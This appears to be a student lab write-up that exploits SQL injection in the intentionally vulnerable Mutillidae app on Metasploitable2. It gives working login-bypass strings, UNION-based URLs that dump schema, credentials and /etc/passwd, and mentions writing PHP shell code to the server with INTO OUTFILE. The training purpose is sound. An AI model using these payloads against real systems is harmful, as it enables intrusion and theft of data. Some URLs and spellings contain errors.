# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/user-attachments/assets/ad593a4d-0316-43eb-be1b-50d79606f8a9)



Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/user-attachments/assets/3c140369-9a1d-4c2d-bf8e-f05fdb56d044)


Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/user-attachments/assets/d70d46cf-4360-4fa8-8f5a-b023dda05b62)

Click on the menu Login/Register and register for an account

![image](https://github.com/user-attachments/assets/938c3b9e-68ce-465d-9bb3-8e5d76d7b9f3)

Click on the link “Please register here”

![image](https://github.com/user-attachments/assets/bd2f194c-9650-46f6-b5d0-d0fcf05fd82d)

Click on “Create Account” to display the following page:

![image](https://github.com/user-attachments/assets/3b6e081f-2d68-4463-98d1-553044bc188e)





The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/user-attachments/assets/b58ab213-bdcc-48bd-bb18-34ac5d36a48e)



Click “Login”. The logged in page will show as below:

![image](https://github.com/user-attachments/assets/87fc7a79-6efe-4566-883a-cd5622351144)






## Bypassing login field

The username field is vulnerable. Put (thaksha’ #) or (thaksha’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “thaksha.”

Now after logging out you will see the login page. In the login page give thaksha’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/user-attachments/assets/d861d8e1-2f4f-4a52-9ed6-4593be322621)



Click the login button and you will see it enter into the administrator page.

![image](https://github.com/user-attachments/assets/1c8aba9c-6e41-4ff4-b83a-f814fb57b060)


## Union-based SQL Injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”


After logging out, Now choose the menu as shown below: 

![image](https://github.com/user-attachments/assets/1e530a93-bfb1-4167-87af-e3b566c698a0)

![image](https://github.com/user-attachments/assets/d5efe233-ad6c-4e66-91c0-875120b78586)

![image](https://github.com/user-attachments/assets/aec92214-08bd-490f-8f9b-a3a0f8fc2aa9)

![image](https://github.com/user-attachments/assets/a0ea5de6-9733-4314-b97b-23368cca7fb1)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/user-attachments/assets/9644277f-e82c-4a8d-aeab-d50f03274d0a)







Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

(http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27order%20by%206%23&password=mutillidae123&user-info-php-submit-button=View+Account+Details)

![image](https://github.com/user-attachments/assets/e04b1f0a-4aa6-4631-a079-1487bf60444e)




After adding the order by 6 into the existing url , the following error statement will be obtained:


![image](https://github.com/user-attachments/assets/3cf39cdd-3f9d-468e-a75b-5b8e6b06752c)



When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.


![image](https://github.com/user-attachments/assets/bd330c54-bfdd-4809-94c3-9bd4076f2617)



As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/user-attachments/assets/7edb3ba2-55ab-441d-a772-4b776f55f47e)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/user-attachments/assets/4dc18748-159e-4c1b-99e9-fbdd73f94617)



As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/user-attachments/assets/ea3e650e-c7c5-4341-ad7a-57b2af28e14d)



Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/user-attachments/assets/750fe512-e6ce-4ede-ba81-0fe9ce6bab3f)






The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

(http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details)




![image](https://github.com/user-attachments/assets/9994a016-8060-49c4-9c29-d8f799b33315)








The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.



![image](https://github.com/user-attachments/assets/23b3ca4b-8254-48b0-8cfb-7170174b6bf0)









The column names of the accounts is displayed below for the following url:

http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/user-attachments/assets/b23227a4-8f5d-4fe8-b2f4-e12e713ec168)







Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/user-attachments/assets/47b71497-117b-4bf1-b899-d0254e1d3ef9)






## Reading and Writing Files on the Web Server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.205.1/mutillidae/index.php?page=user-info.php&username=thaksha%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/user-attachments/assets/2c5dbe79-9041-42de-9e85-e2e011d0fa14)





the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
